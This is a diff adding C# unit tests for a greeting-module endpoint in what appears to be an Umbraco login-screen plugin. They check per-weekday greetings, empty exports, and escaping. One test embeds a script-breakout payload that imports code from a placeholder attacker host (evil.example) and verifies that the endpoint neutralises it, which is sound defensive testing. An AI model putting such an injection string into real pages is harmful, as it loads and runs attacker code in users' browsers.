@@ -712,6 +712,197 @@ public sealed class RuntimeControllerTests : IDisposable
 			entry.Message.Contains("HMAC is configured", StringComparison.Ordinal));
 	}
 
+	[Fact]
+	public async Task GreetingModule_Exports_The_Resolved_Greeting_For_All_Seven_Days()
+	{
+		WriteConfig("""
+		{
+		  "assets": [
+		    {
+		      "id": "asset-rule",
+		      "name": "Matched",
+		      "kind": 0,
+		      "altText": null,
+		      "greetingText": "För framtiden",
+		      "logoAssetId": null,
+		      "storagePath": "assets/rule-background.png",
+		      "publicPath": null,
+		      "width": 1920,
+		      "height": 1080,
+		      "createdAt": "2026-05-16T00:00:00Z",
+		      "updatedAt": "2026-05-16T00:00:00Z"
+		    }
+		  ],
+		  "rules": [
+		    {
+		      "id": "rule-1",
+		      "name": "Monday",
+		      "priority": 100,
+		      "enabled": true,
+		      "condition": "{\"and\":[{\"==\":[{\"var\":\"weekday\"},\"monday\"]}]}",
+		      "assetId": "asset-rule"
+		    }
+		  ],
+		  "settings": {
+		    "publicEndpointCacheSeconds": 300
+		  }
+		}
+		""");
+
+		var controller = CreateGreetingController(new DateTimeOffset(2026, 5, 18, 9, 0, 0, TimeSpan.Zero));
+
+		var result = Assert.IsType<ContentResult>(await controller.GreetingModule());
+
+		Assert.Equal("text/javascript; charset=utf-8", result.ContentType);
+		Assert.Equal("no-store", controller.Response.Headers.CacheControl);
+
+		var login = ParseModuleDefaultExport(result.Content!).GetProperty("login");
+		for (var day = 0; day < 7; day++)
+		{
+			Assert.Equal("För framtiden", login.GetProperty($"greeting{day}").GetString());
+		}
+	}
+
+	[Fact]
+	public async Task GreetingModule_Exports_An_Empty_Object_When_No_Rule_Matches()
+	{
+		WriteConfig("""
+		{
+		  "assets": [],
+		  "rules": [],
+		  "settings": {
+		    "publicEndpointCacheSeconds": 300
+		  }
+		}
+		""");
+
+		var controller = CreateGreetingController(new DateTimeOffset(2026, 5, 18, 9, 0, 0, TimeSpan.Zero));
+
+		var result = Assert.IsType<ContentResult>(await controller.GreetingModule());
+
+		// The module must stay importable when there is nothing to override — an empty
+		// default export merges nothing and Umbraco's core greetings show as normal.
+		Assert.Equal("no-store", controller.Response.Headers.CacheControl);
+		Assert.Empty(ParseModuleDefaultExport(result.Content!).EnumerateObject());
+	}
+
+	[Fact]
+	public async Task GreetingModule_Exports_An_Empty_Object_When_The_Resolved_Asset_Has_No_Greeting()
+	{
+		WriteConfig("""
+		{
+		  "assets": [
+		    {
+		      "id": "asset-rule",
+		      "name": "Matched",
+		      "kind": 0,
+		      "altText": null,
+		      "greetingText": "   ",
+		      "logoAssetId": null,
+		      "storagePath": "assets/rule-background.png",
+		      "publicPath": null,
+		      "width": 1920,
+		      "height": 1080,
+		      "createdAt": "2026-05-16T00:00:00Z",
+		      "updatedAt": "2026-05-16T00:00:00Z"
+		    }
+		  ],
+		  "rules": [
+		    {
+		      "id": "rule-1",
+		      "name": "Catch-all",
+		      "priority": 100,
+		      "enabled": true,
+		      "condition": "{\"and\":[]}",
+		      "assetId": "asset-rule"
+		    }
+		  ],
+		  "settings": {
+		    "publicEndpointCacheSeconds": 300
+		  }
+		}
+		""");
+
+		var controller = CreateGreetingController(new DateTimeOffset(2026, 5, 18, 9, 0, 0, TimeSpan.Zero));
+
+		var result = Assert.IsType<ContentResult>(await controller.GreetingModule());
+
+		Assert.Empty(ParseModuleDefaultExport(result.Content!).EnumerateObject());
+	}
+
+	[Fact]
+	public async Task GreetingModule_Escapes_Greetings_That_Would_Otherwise_Break_Out_Of_The_Script()
+	{
+		WriteConfig("""
+		{
+		  "assets": [
+		    {
+		      "id": "asset-rule",
+		      "name": "Matched",
+		      "kind": 0,
+		      "altText": null,
+		      "greetingText": "\"};import('https://evil.example');//",
+		      "logoAssetId": null,
+		      "storagePath": "assets/rule-background.png",
+		      "publicPath": null,
+		      "width": 1920,
+		      "height": 1080,
+		      "createdAt": "2026-05-16T00:00:00Z",
+		      "updatedAt": "2026-05-16T00:00:00Z"
+		    }
+		  ],
+		  "rules": [
+		    {
+		      "id": "rule-1",
+		      "name": "Catch-all",
+		      "priority": 100,
+		      "enabled": true,
+		      "condition": "{\"and\":[]}",
+		      "assetId": "asset-rule"
+		    }
+		  ],
+		  "settings": {
+		    "publicEndpointCacheSeconds": 300
+		  }
+		}
+		""");
+
+		var controller = CreateGreetingController(new DateTimeOffset(2026, 5, 18, 9, 0, 0, TimeSpan.Zero));
+
+		var result = Assert.IsType<ContentResult>(await controller.GreetingModule());
+
+		// The payload between `export default ` and the trailing `;` must stay a single
+		// JSON literal — a greeting containing quotes or braces must round-trip intact.
+		var login = ParseModuleDefaultExport(result.Content!).GetProperty("login");
+		Assert.Equal("\"};import('https://evil.example');//", login.GetProperty("greeting0").GetString());
+	}
+
+	private RuntimeController CreateGreetingController(DateTimeOffset localNow)
+	{
+		var controller = new RuntimeController(
+			CreateStore(),
+			new RecordingFileService(),
+			new LeLøginScreenRuntimeResolver(new StubRandom()),
+			new FixedTimeProvider(localNow),
+			new NullLogger<RuntimeController>(),
+			TestFileSystems.AssetFileManager(_contentRootPath),
+			Options.Create(new ImageSharpMiddlewareOptions()))
+		{
+			ControllerContext = new ControllerContext { HttpContext = new DefaultHttpContext() }
+		};
+		controller.ControllerContext.HttpContext.Request.Host = new HostString("localhost");
+		return controller;
+	}
+
+	private static System.Text.Json.JsonElement ParseModuleDefaultExport(string moduleSource)
+	{
+		Assert.StartsWith("export default ", moduleSource, StringComparison.Ordinal);
+		Assert.EndsWith(";", moduleSource, StringComparison.Ordinal);
+
+		var json = moduleSource["export default ".Length..^1];
+		return System.Text.Json.JsonDocument.Parse(json).RootElement;
+	}
+
 	public void Dispose()
 	{
 		if (Directory.Exists(_contentRootPath))
